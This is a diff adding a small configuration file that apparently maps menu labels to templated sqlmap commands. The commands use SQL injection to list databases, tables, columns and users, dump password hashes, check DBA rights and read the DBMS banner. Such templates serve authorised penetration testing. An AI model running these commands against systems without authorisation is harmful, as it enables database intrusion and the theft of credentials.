@@ -1,0 +1,8 @@
+Enumerate Databases (list all databases)=sqlmap -u "<target_url>" --dbs
+Enumerate Tables (in a specific database)=sqlmap -u "<target_url>" -D <database_name> --tables
+Enumerate Columns (in a specific table)=sqlmap -u "<target_url>" -D <database_name> -T <table_name> --columns
+Enumerate Users (list database users)=sqlmap -u "<target_url>" --users
+Enumerate Password Hashes (for database users)=sqlmap -u "<target_url>" --passwords
+Enumerate Current User and Database (identify current context)=sqlmap -u "<target_url>" --current-user --current-db
+Check if Current User is DBA (database administrator)=sqlmap -u "<target_url>" --is-dba
+Retrieve DBMS Banner (version information)=sqlmap -u "<target_url>" --banner
